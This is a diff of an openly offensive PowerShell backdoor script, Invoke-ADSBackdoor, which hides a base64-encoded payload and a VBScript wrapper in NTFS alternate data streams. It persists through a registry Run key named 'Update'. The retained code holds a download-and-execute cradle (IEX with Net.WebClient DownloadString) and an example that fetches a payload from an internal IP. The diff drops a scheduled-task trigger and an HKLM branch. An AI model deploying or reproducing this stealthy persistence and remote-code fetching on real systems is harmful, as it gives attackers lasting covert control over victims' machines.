@@ -4,7 +4,6 @@ function Test-IsAdmin {
 
 }
 
-
 function Invoke-ADSBackdoor{
 <#
 .SYNOPSIS
@@ -18,9 +17,6 @@ stores some VBScript that acts as a wrapper in order to hide the DOS prompt when
 payload. When passing the arguments, you have to include the function and any parameters required by your payload. 
 The arguments must also be in quotation marks.
 
-.EXAMPLE
-TO Remove ADSbackdoor:
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/simonpunk/simon/master/Invoke-ADSBackdoor.ps1'); Remove-ADSBackdoor
 
 .EXAMPLE
 PS C:\Users\test\Desktop> Invoke-ADSBackdoor -URL http://192.168.1.138/payload.ps1 -Arguments "hack"
@@ -68,7 +64,7 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     $textFile = $TextfileName -split '\.',([regex]::matches($TextfileName,"\.").count) -join ''
     $VBSfileName = [System.IO.Path]::GetRandomFileName() + ".vbs"
     $vbsFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''
-    
+
     #Store Payload
     $payloadParameters = "IEX ((New-Object Net.WebClient).DownloadString('$URL')); $Arguments"
     $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payloadParameters))
@@ -85,22 +81,14 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     #Create Alternate Data Streams for Payload and Wrapper
     $CreatePayloadADS = {cmd /C "echo $payload > $env:USERPROFILE\AppData:$textFile"}
     $CreateWrapperADS = {cmd /C "echo $vbtext > $env:USERPROFILE\AppData:$vbsFile"}
-    $CreateScheduleADS = {cmd /c "SCHTASKS /Create /SC MINUTE /MO 30 /TN Update /TR $env:USERPROFILE\AppData:$vbsFile /F"}
     Invoke-Command -ScriptBlock $CreatePayloadADS
     "Payload stored in $env:USERPROFILE\AppData:$textFile"
     Invoke-Command -ScriptBlock $CreateWrapperADS
     "Wrapper stored in $env:USERPROFILE\AppData:$vbsFile"
-    Invoke-Command -ScriptBlock $CreateScheduleADS
-    "Schedule payload is triggered on every 30 minutes"
-    
-    #Check if powershell session is run as Admin, then register persistent payload in Registry
-    if (!(Test-IsAdmin)){
-        new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
-    }
-    else {
-        new-itemproperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
-    }
-    "Process Complete."
+
+    #Persist in Registry
+    new-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
+    "Process Complete. Persistent key is located at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Update"
 }
 
 
@@ -177,9 +165,7 @@ removing the registry key.
     $vbsFile = $trigger.split(" ")[1]
     $getWrapperADS = {cmd /C "more <  $vbsFile"}
     $wrapper = Invoke-Command -ScriptBlock $getWrapperADS
-    $Killschtasks = {cmd /C "schtasks /delete /tn Update /f"}
-    
-    Invoke-Command -ScriptBlock $Killschtasks
+
     if ($wrapper -match 'i in \((.+?)\)')
     {
         # extract out the payload .txt file location
